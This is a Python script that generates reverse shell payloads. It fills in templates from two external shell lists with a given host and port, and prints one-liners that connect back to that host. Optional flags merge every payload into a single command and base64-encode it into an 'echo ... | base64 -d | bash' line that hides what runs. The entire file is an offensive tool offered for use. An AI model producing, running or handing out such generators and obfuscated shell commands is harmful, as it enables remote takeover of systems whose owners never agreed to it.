#!/usr/bin/env python3
import sys
import os
import argparse
import base64

def read_file(filename=None):
    FULLPATH = os.path.dirname(os.path.realpath(__file__)) + "/" + filename
    with open(FULLPATH) as shell_file:
        for line in shell_file:
            payload = line.strip()
            if not payload.startswith("#"):
                yield payload

def parse_arguments():
    parser = argparse.ArgumentParser()
    
    parser.add_argument("-H", "--host", help="Hostname or IP of the server", required=True)
    parser.add_argument("-P", "--port", help="Port of the server", required=True)
    parser.add_argument("-A", "--all", help="Use this argument to generate a full one liner to try all the reverse shell possible.", action="store_true")
    parser.add_argument("-B", "--base64", help="Encode all the reverse shells in base64 and build a one liner to execute the decoded string", action="store_true")

    return parser.parse_args()

def generate(HOST="127.0.0.1", PORT=4444):
    result = []
    for line in read_file("personal_shells.txt"):
        payload_name, payload_code = line.split('|', 1)

        ready_payload = payload_code.replace("{HOST}", HOST).replace("{PORT}", PORT)
        result.append((payload_name, ready_payload))
    
    for line in read_file("default_shells.txt"):
        payload_name, payload_code = line.split('|', 1)

        ready_payload = payload_code.replace("{HOST}", HOST).replace("{PORT}", PORT)
        result.append((payload_name, ready_payload))
    return result

if __name__ == "__main__":
    args = parse_arguments()
    
    payloads = generate(HOST=args.host, PORT=args.port)

    if args.all:
        code_payloads = []
        for name, code in payloads:
            code_payloads.append(code)
        all_payloads = ");(".join(code_payloads)
        all_payloads = "(" + all_payloads + ")"
        print('\n\033[92;1m All in one\033[0m')
        if args.base64:
            b64_paylaods = base64.b64encode(all_payloads.encode('utf-8')).decode('utf-8')
            print(f'\033[32mecho {b64_paylaods} | base64 -d | bash\033[0m')
        else:
            print(f'\033[32m{all_payloads}\033[0m')
    else:
        for name, code in payloads:
            print(f'\n\033[92;1m {name}\033[0m')
            if args.base64:
                b64_paylaod = base64.b64encode(code.encode('utf-8')).decode('utf-8')
                print(f'\033[32mecho {b64_paylaod} | base64 -d | bash\033[0m')
            else:
                print(f'\033[32m{code}\033[0m')
